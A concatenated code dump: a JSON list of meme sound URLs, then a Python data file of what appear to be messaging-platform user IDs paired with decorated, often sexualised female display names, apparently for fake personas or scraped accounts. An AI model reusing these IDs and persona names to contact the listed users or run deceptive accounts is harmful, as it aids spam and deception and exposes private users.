        "url": "https://www.myinstants.com/media/sounds/augh-augh-aaaaaauuuuuugh.mp3",
        "title": "Augh Augh AAAAAAUUUUUUGH"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/m_fixed_OCSatGz.mp3",
        "title": "العيد"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/x-files-theme-song-copy.mp3",
        "title": "illuminati Confirmed"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/nokia-ringtone-arabic.mp3",
        "title": "Nokia Arabic Ringstone"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/nani_Pmxf5n3.mp3",
        "title": "omae wa mou shindeiru NANI"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/gta-san-andreas-mission-complete-sound-hq.mp3",
        "title": "GTA SA Mission Passed"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/-_RvDkLk8.mp3",
        "title": "شجاع كريم"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/movie_1_C2K5NH0.mp3",
        "title": "Bruh meme"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/hahahawtfwasthatsoundeffect245.mp3",
        "title": "Hahaha what the f**k"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/nom-nom-nom_gPJiWn4.mp3",
        "title": "minecraft eating"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/squidward-walking-sound.mp3",
        "title": "squidward walking"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/haaaaaaa_ECtJBLV.mp3",
        "title": "HAAAAAAA"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/ebunegeym-audiotrimmer.mp3",
        "title": "cj ah"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/tmpuihkr6nu.mp3",
        "title": "زيج"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/meme-de-creditos-finales.mp3",
        "title": "Meme final"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/cut_y2mate_8qYkIOg.mp3",
        "title": "صدما كبيرا"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/896756043-mc.mp3",
        "title": "زعلتي ما زعلتي"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/error_CDOxCYm.mp3",
        "title": "Error SOUNDSS"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/snoop-dogg-base-instrumental.mp3",
        "title": "Thug life instrumental"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/dry-fart.mp3",
        "title": "Fart"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/______I6418kK.mp3",
        "title": "الله اكبر عليك"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/999_Z871W0o.mp3",
        "title": "القم"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/aughhhhh-aughhhhh.mp3",
        "title": "AUGHHHHH... AUGHHHHH"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/spongebob-fail.mp3",
        "title": "SpongeBob Fail"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/and-his-name-is-john-cena-1.mp3",
        "title": "and his name is John Cenaaaaaa"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/my-video1_KRP2y6Q.mp3",
        "title": "اسكت"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/tmp5g9r95pr.mp3",
        "title": "اني شعلية"
    },
    {
        "url": "https://www.myinstants.com/media/sounds/shocked-sound-effect.mp3",
        "title": "Shocked"
    }
]
# ==================== FILE: persianData.py ====================
persianInformation = {
    "ids": [
        1997772465,
        5544838600,
        5401963095,
        5079991659,
        2075299810,
        5216136605,
        2035919241,
        5171584112,
        5357377752,
        5061627443,
        1762219994,
        1955414716,
        5426113130,
        5418316472,
        2055165325,
        5443477044,
        1969792517,
        5376437735,
        1624943611,
        5586837014,
        1946084801,
        1618719076,
        1851255970,
        2089753768,
        2001773252,
        1996420746,
        5467938011,
        2099916556,
        5054794537,
        1965581920,
        1437454466,
        2062744269,
        1611247952,
        2069257550,
        2015510598,
        1873761194,
        1967053580,
        1603259573,
        1719809276,
        2007609873,
        5599517265,
        1965788282,
        1798391933,
        5243677150,
        2021596156,
        2065054805,
        2014778109,
        1640995783,
        5417022385,
        1954655703,
        5429792284,
        5553675999,
        5722719471,
        2002110970,
        2063268794,
        5116825602,
        2142662975,
        1635122012,
        5446686194,
        2078318098,
        5797843265,
        1851569092,
        5440938937,
        6204350735,
        2042428329,
        2024131741,
        5861053785,
        2087304356,
        1913130802,
        1971922959,
        5528105357,
        2090260981,
        1178278192,
        1838382750,
        2087383377,
        1978173339,
        1199326464,
        1950439608,
        1996388516,
        1946847540,
        5394105475,
        2012433647,
        1709449166,
        1623177656,
        2067232364,
        5428121665,
        1989450836,
        1836847663,
        5639654740,
        5435690019,
        1754267433,
        1511768536,
        2033206858,
        1881035170,
        5509272952,
        5614272991,
        1345112636,
        1627263467,
        5620506021,
        5601755893,
        2081952488,
        5694445327,
        6083856380,
        5175154858,
        1968659067,
        2020378654,
        2069733744,
        5885187666,
        5782647943,
        5629040037,
        5597326183,
        6093708680,
        2049945851,
        2080973484,
        2013080881,
        2038471843,
        5456630931,
        5402690842,
        2078057624,
        5858147272,
        5544032542,
        1970049786,
        5700141776,
        2082862601,
        5666140503,
        5386705302,
        5291521110,
        1909650972,
        1873292296,
        2030457050,
        1715463384,
        1966287774,
        2055196055,
        6043457643,
        1899727148,
        1948802674,
        5946468543,
        1709383224,
        2072577409,
        1915271168,
        2030868696,
        5354589789,
        2089456044,
        2090111168,
        5850833633,
        1987724505,
        6216621438,
        2029262539,
        1976930474,
        5692805568,
        5761705113,
        1951418341,
        1928446710,
        1754868078,
        5742687363,
        5028136399,
        2094948299,
        5132325709,
        1826818562,
        2042257135,
        2072079722,
        1837782791,
        1627180196,
        2025389979,
        2008934608,
        5535715527,
        5488814384,
        5645083860,
        1270338283,
        5945120430,
        1902402339,
        5613311917,
        5290539030,
        1996991557,
        1967027336,
        2084405090,
        1721885034,
        1573374090,
        5289711545,
        5531343203,
        5612754431,
        956500134,
        5484453459,
        5683519671,
        1863356121,
        2081388874,
        2025950253,
        2084383993,
        1991157265,
        1968227682,
        1815558747,
        2018707162,
        5860773168,
        1731261399,
        1264255500,
        998657133,
        5002329039,
        1795803212,
        1926024900,
        5129171509,
        5812150801,
        1431554982,
        5358346246,
        5199738634,
        1959167159,
        2022766059,
        2086502840,
        5728037532,
        1406038783
    ],
    "last_names": [
        "🖤🖤",
        "",
        "💔",
        "𝖎𝖓𝖆❤️",
        "علوی",
        "😊😊",
        "mashhadi",
        "💗💗",
        "💋💋💋",
        "😍😍",
        "🧜‍♀🔥",
        "😎",
        "امیری",
        "yarahmadi",
        "‌‌",
        "شجاعی",
        "",
        "💋💋",
        "gg",
        "",
        "اکبرزاده",
        "𝕶𝖆𝖒𝖊𝖑𝖎𝖆",
        "تقی پور",
        "",
        "😍😍",
        "😍😍",
        "Pro jakes",
        "",
        "titi",
        "💞",
        "🅰️",
        "💋💋💋",
        "😊😊",
        "𝐍𝐄𝐌𝐎",
        "💜",
        "ｉ",
        "مبارکی",
        "Berta",
        "💋💋",
        "امیری",
        "مبری",
        "🐼",
        "امیری",
        "delavari",
        "❤️‍🔥",
        "𝕶𝖆𝖒𝖊𝖑𝖎𝖆",
        "❤️❤️",
        "bano💘",
        "Behzadian",
        "",
        "🐣",
        "🍁",
        "😌",
        "😐",
        "”°¹~•-.„¸",
        "😐",
        "‌‌.",
        "😎",
        "💋",
        "محمدی",
        "Nasiri",
        "💓💓💓",
        "🅸",
        "افدیده",
        "💔",
        "😌",
        "🖤",
        "",
        "safaee",
        "𝕶𝖆𝖒𝖊𝖑𝖎𝖆",
        "🇺🇸",
        "𝕶𝖆𝖒𝖊𝖑𝖎𝖆",
        "💙💙",
        "ضیایی",
        "جمشیدی",
        "امیری",
        "🇺🇸",
        "😞",
        "محمودی",
        "💜",
        "😳",
        "The colorful girl of the commune",
        "💙💙",
        "🍁",
        "𝚗𝚊",
        "🎃",
        "💋💋💋",
        "💛💛",
        "😌",
        "ｉ",
        "",
        "😍😍",
        "💙💙",
        "🍁",
        "کبریادار",
        "The colorful girl of the commune",
        "The colorful girl of the commune",
        "The colorful girl of the commune",
        "💙💙💙",
        "𝕶𝖆𝖒𝖊𝖑𝖎𝖆",
        "فرجی",
        "bahrami",
        "💔",
        "𝕶𝖆𝖒𝖊𝖑𝖎𝖆",
        "𝕶𝖆𝖒𝖊𝖑𝖎𝖆",
        "⁪⁬⁮⁮⁮⁮ ‌"
    ],
    "names": [
        "shima",
        "donya",
        "dorsa",
        "Kiana☘️🔥👙",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "꧁roya꧂",
        "🅽🅰️🆉",
        "A♥️y♥️n♥️a♥️a♥️z",
        "mobina",
        "raha",
        "𝑠𝑎𝑟𝑖𝑛𝑎",
        "لیلا😁🌈",
        "🐚♙ دنیا ☠️💘",
        "فاطمه",
        "ایناز",
        "☹️🐚 نگین ♬👻",
        "baran",
        "(♥‿♥) Pani (♥‿♥)",
        "maryam",
        "(♥‿♥) Pani (♥‿♥)",
        "پریا",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "░M░e░l░ ░M░e░l░",
        "هستی:-\\🌈",
        "👌🐣 ایدا 💋🐧",
        "✼ ҉ elmira ҉ ✼",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "Men gomoseksualligimni yaxshi ko'raman",
        "*•.¸♡ مهلا ♡¸.•*",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "Roya",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "",
        "ʀᴏʏᴀ",
        "(♥‿♥) Pani (♥‿♥)",
        "ترانه🌈",
        "˜”*°•.˜”*°• نرگس •°*”˜.•°*”˜",
        "mobina",
        "💜 یاسمین ♣️☟",
        "sahar",
        "【﻿ｍａｒｙａｍ",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "Z♥️a♥️h♥️r♥️a",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "(♥‿♥) Pani (♥‿♥)",
        "هستی",
        "دنیا",
        "yalda",
        "صبا",
        "کوثر",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "░T░i░n░a░",
        "¸„.-•~¹°”ˆ˜¨ نازنین ¨˜ˆ",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "پریا",
        "𝓼𝓪𝓻𝓪",
        "رویا",
        "╰⊱♥️⊱╮ღ꧁ elmira ꧂ღ╭⊱♥️≺",
        "ایناز",
        "🍕 Samar 🍒",
        "✿.｡.:* ::. مهسا .::.*.:｡.✿",
        "𝓔𝓵𝓱𝓪𝓶 𝓴𝓱𝓪𝓷𝓾𝓶",
        "🍌 Parmis 💘",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "🍩💀 𝒆𝓵ｎάŻ 🐸💞",
        "رها",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "",
        "🅺🅰🆃🅸",
        "˜”*°•.˜”*°• پریسا •°*”˜.•°*”˜",
        "ᶳᵃʰᵃʳ",
        "مّرّیّمّ",
        "ｓａｈａｒ",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "ｓａｈａｒ",
        "ساناز",
        "░B░i░t░a░",
        "هدیه🌹",
        "taniam",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "ساناز",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "(♥‿♥) Pani (♥‿♥)",
        "رویا",
        "baran",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "꧁roya꧂",
        "(♥‿♥) Pani (♥‿♥)",
        "پریا",
        "🙂Parisa🧜‍♀️",
        "🌈",
        "(♥‿♥) Pani (♥‿♥)",
        "yalda",
        "ساناز",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "Grace",
        "✨ Yekta 👠",
        "𝚜𝚊𝚛𝚒",
        "Mehri",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "آذࢪ",
        "Rafa",
        "negen",
        "فاطمه",
        "🍒 Ｍａｎｓｏｒｅｈ",
        "𝓼𝓪𝓻𝓪",
        "💚👮 ندا ♨️🍓",
        "【﻿Ｅｌｎａｚ】",
        "ᶳᵃʰᵃʳ",
        "asma",
        "~~<💚> sexy women <💚>~~",
        "𝓼𝓪𝓻𝓪",
        "💧 Yasna 🔞",
        "hana",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "naughty girl",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "M",
        "هستی",
        "ｎａｚ",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "مهستی😛",
        "人人人 مریم 人人人",
        "(♥‿♥) Pani (♥‿♥)",
        "Darya",
        "𝓔𝓵𝓱𝓪𝓶 𝓴𝓱𝓪𝓷𝓾𝓶",
        "💖 Faranak 👒",
        "yasi:-\\",
        "tani💕🌻",
        "NarGes",
        "░M░e░l░ ░M░e░l░",
        "(っ◔◡◔)っ ♥️ roya ♥️",
        "▀▄▀▄▀▄ مریم ▄▀▄▀▄▀",
        "ⓢⓐⓗⓐⓡ",
        "sanaz",
        "˜”*°•.˜”*°• پریسا •°*”˜.•°*”˜",
        "▁ ▂ ▄ ▅ ▆ ▇ █ دختر پاییر █ ▇ ▆ ▅ ▄ ▂ ▁",
        "❣️ 彡 زینب 彡 🧜‍♀️",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "𝒮𝒶𝒽𝒶𝓇",
        "sanaz",
        "yalda",
        "ساناز",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "(♥‿♥) Pani (♥‿♥)",
        "#",
        "(っ◔◡◔)っ ♥️ فرناز ♥️",
        "Z♥️a♥️h♥️r♥️a",
        "🆂🅰️🆁",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "ıllıllı مریم ıllıllı",
        "░▒▓█ یلـבا █▓▒░",
        "ترانه🌈",
        "tina🎈",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "ıllıllı مریم ıllıllı",
        "sara",
        "کیمیا",
        "🌈",
        "😌 Rokhsar ☘️",
        "🅺🅰🆃🅸",
        "ایناز",
        "(っ◔◡◔)っ ♥️ نازنین زهرا ♥️",
        "sahar",
        "",
        "•´¯`•. آوینا جون .•´¯`•",
        "🌈",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "سارا",
        "sara",
        "Fatemeh",
        "🌈",
        "elnaz",
        "parisa😘💕",
        "✞༒Nafas༒✞",
        "✼ ҉ elmira ҉ ✼",
        "Ａｔｅｎａ",
        "",
        "مهتاب",
        "shima",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "مرضــ😉ــیه",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "",
        "🅺🅰🆃🅸",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "افسانه",
        "",
        "¸„.-•~¹°”ˆ˜¨ نازنین ¨˜ˆ",
        "شوقر برذر | 𝑹𝒔",
        "ساناز",
        "♬♡ساناز♡♬",
        "vida",
        "☹️🐚 نگین ♬👻",
        "人人人 مریم 人人人",
        "شیما",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "زهرا🐥",
        "Ａｔｅｎａ",
        ".•♫•♬• سپیده •♬•♫•.",
        "ℕ𝕒𝕫𝕒𝕟𝕚𝕟",
        "░N░A░S░T░A░R░A░N░",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "مهری",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "elham",
        "✞✞ معصومه ✞✞",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "zahra",
        "naughty girl",
        "ıllıllı سمیرا ıllıllı",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "░M░e░l░ ░M░e░l░",
        "bita",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "",
        "~~<💚> sexy women <💚>~~",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "Loly🍰",
        "رها",
        "Men gomoseksualligimni yaxshi ko'raman",
        "donya",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "🐚♙ دنیا ☠️💘",
        "sexy fake saxy",
        "طناز:-[",
        "▁ ▂ ▄ ▅ ▆ ▇ █ دختر پاییر █ ▇ ▆ ▅ ▄ ▂ ▁",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "🅺🅰🆃🅸",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "R̾a̾h̾a̾ ̾B̾a̾n̾o̾o̾",
        "هستی",
        "░▒▓█►─═ سارا ═─◄█▓▒░",
        "dorsa",
        "tani",
        "• LouLa 🦊🌙",
        "✞༒Nafas༒✞",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "💚👮 ندا ♨️🍓",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "sanaz",
        "👣🐉 لاله 🌷✎",
        "🍩💀 𝒆𝓵ｎάŻ 🐸💞",
        "baran",
        "",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "sara",
        "✼ ҉ elmira ҉ ✼",
        "یاسمین",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "asma",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "",
        "🆂🅰️🆁🅰️",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "(♥‿♥) Pani (♥‿♥)",
        "(♥‿♥) Pani (♥‿♥)",
        "(♥‿♥) Pani (♥‿♥)",
        "ساناز",
        "╰⊱♥️⊱╮ღ꧁ elmira ꧂ღ╭⊱♥️≺",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "رها",
        "elham",
        "➶➶➶➶➶ 𝓓Ｏηʸ𝔸 ➷➷➷➷➷",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "هستی",
        "بهاره💜",
        "♬♡ساناز♡♬",
        "درامد در منزل",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "نرگس",
        "🆂🅰️🆁",
        "👣🐉 لاله 🌷✎",
        "آیناز",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "raha",
        "𝔽𝕠𝕣𝕖𝕤𝕥 𝔸𝕟𝕘𝕖𝕝",
        "بهار",
        "➶➶➶➶➶ 𝓓Ｏηʸ𝔸 ➷➷➷➷➷",
        "🅂🄰🄷🄰🅁",
        "فاطمه",
        "▀▄▀▄▀▄ 🎀 نفس خوشگله 🎀 ▄▀▄▀▄▀",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "(♥‿♥) Pani (♥‿♥)",
        "💤📿roya📿💤",
        "رها",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "قاصدک",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "نرگس",
        "Haniye",
        "¸„.-•~¹°”ˆ˜¨ آتریسا خانم ¨˜ˆ”°¹~•-.„¸",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "🅺🅰🆃🅸",
        "☹️🐚 نگین ♬👻",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "◦•●◉✿ دلارام جووون ✿◉●•◦",
        "🆂🅰️🆁",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "Darya",
        "人人人 مریم 人人人",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "elnaz",
        "☺️👻 𝐬ĤａЌ𝓲𝓡𝔞 ♪♧",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "mobina",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "بهار",
        "ساناز",
        "",
        "🔥🧜‍♀",
        "مَِهَِگَِلَِ",
        "░▒▓█ پرستو زیبا █▓▒░",
        "باران",
        "ღ꧁ღ╭⊱ꕥ بیتا ꕥ⊱╮ღ꧂ღ",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "🔥🧜‍♀",
        "🐚♙ دنیا ☠️💘",
        "𝙄 𝙖𝙢 𝙈𝙖𝙧𝙞𝙖, 𝙖𝙣 𝙚𝙢𝙤𝙩𝙞𝙤𝙣𝙖𝙡 𝙜𝙞𝙧𝙡",
        "elham",
        "Farzaneh",
        "سمیار",
        "彡MaahDokht彡",
        "🍪 فائزه 👻🎯",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "(♥‿♥) Pani (♥‿♥)",
        "𝓘𝓼𝓪𝓫𝓮𝓵𝓵𝓪",
        "F̶͋͌͗ ̥̟̟̠̇̃̌ớ̴͙͌̽̽̅̎̂̅̕r̶̪̰̖̉͐̓̓́̑͝e̴ ͐̓͑͋̏͘ ̡̟̙͙͂s̸̜̭̈́̇̅͛͋͂̈",
        "sexy fake saxy",
        "✶ 🎀 فرناز 🎀 ✶",
        "~~<💚> sexy women <💚>~~",
        "raha",
        "ۛ ּا̍نۨــٰ̍ا̍ ּمۘــنۨ ̨ا̍ڕڞ ا̍ﻻ̍ۙهــڔٰا̍مۘــٰا̍ٺ ا̍ڷــٽــﻼ̍ۙٽــۃ",
        "𝕞𝕒𝕣𝕪𝕒𝕞",
        "♗♙ Ａ𝓃𝐠𝒆ㄥｌᗩ 🐊☮️",
        "raha",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "( ･_･)»(ﾟｰﾟ)»(｡_｡) Lady Alis (｡_｡)«(ﾟｰﾟ)«( ･_･)",
        "دریا",
        "فاطمه",
        "تَمنـــا",
        "ıllıllı مریم ıllıllı",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "R̾a̾h̾a̾ ̾B̾a̾n̾o̾o̾",
        "elnaz",
        "هستی^_^💄",
        "✶ 🎀 بهار 🎀 ✶",
        "彡 نازنین",
        "زیتــون",
        "",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "donya",
        "sogand",
        "↤↤↤↤↤ درسا بانو ↦↦↦↦↦",
        "ｒｏｙａ",
        "🔥🧜‍♀",
        "nazanin",
        "🅐 🅖🅘🅡🅛 🅛🅘🅚🅔 🅜🅔 🅘🅢 🅦🅔🅐🅚 🅑🅤🅣 🅗🅞🅟🅔🅕🅤🅛",
        "roya",
        "🅺🅰🆃🅸",
        "ıllıllı مریم ıllıllı",
        ".·´¯·-> Do you want ? <-·´¯·.",
        "R̾a̾h̾a̾ ̾B̾a̾n̾o̾o̾",
        "elnaz",
        "هستی^_^💄",
        "✶ 🎀 بهار 🎀 ✶",
        "彡 نازنین",
        "زیتــون",
        "",
        "Ｂｉｔｃｈ Ｇｉｒｌ",
        "(¯´•._.• يا رجل عربي لنتكلم •._.•´¯)",
        "donya",
        "sogand",
        "↤↤↤↤↤ درسا بانو ↦↦↦↦↦",
        "ｒｏｙａ",
        "🔥🧜‍♀",
        "nazanin",
